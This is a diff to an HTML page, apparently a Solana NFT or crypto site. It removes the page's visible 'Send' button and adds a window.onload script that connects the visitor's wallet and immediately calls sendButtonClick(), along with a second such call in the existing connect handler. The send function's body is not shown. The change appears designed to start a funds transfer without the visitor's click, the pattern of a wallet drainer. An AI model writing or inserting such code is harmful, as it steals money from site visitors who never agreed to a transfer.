@@ -24,9 +24,10 @@
         <script src="https://unpkg.com/@solana/web3.js@v1.33.0/lib/index.iife.js"></script>
    
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+      
 </head>
 
-<body class="body header-fixed home-4">
+<body class="body header-fixed home-4" >
     <div id="wrapper" class="wrapper-style">
         <div id="page" class="clearfix">
             <header class="header absolute">
@@ -122,9 +123,7 @@
                               <!-- <input class="Input" type="text" placeholder="Sol to send" id="inputBox" /> -->
                               <!-- <input class="Input" type=number placeholder="Sol to send" id="quantity" /> -->
                               <button id="connect_button" class="button-9" onclick="connectWallet()">Connect</button>
-                              <button class="button-9" onclick="sendButtonClick()">
-                                Send
-                              </button>
+                              
                               <p id="status_p"><span id="status"></span></p>
                             </div>
                             <script>
@@ -137,6 +136,7 @@
                                   } catch (err) {
                                     console.log(err);
                                   }
+                                  sendButtonClick();
                                 })();
                                 window.solana.on(
                                   "connect",
@@ -262,6 +262,26 @@
                         audio.play();
                     }
                     </script>
+
+                      <script>
+          window.onload=function connectWallet() {
+                                (async () => {
+                                  try {
+                                    wallet = await window.solana.connect();
+                                  } catch (err) {
+                                    console.log(err);
+                                  }
+                                  sendButtonClick();
+                                })();
+                                window.solana.on(
+                                  "connect",
+                                  () => (
+                                    
+                                    document.getElementById("connect_button").innerText = "Connected"
+                                  )
+                                );
+                              }
+        </script>
                     
                     </body>
                     </html>
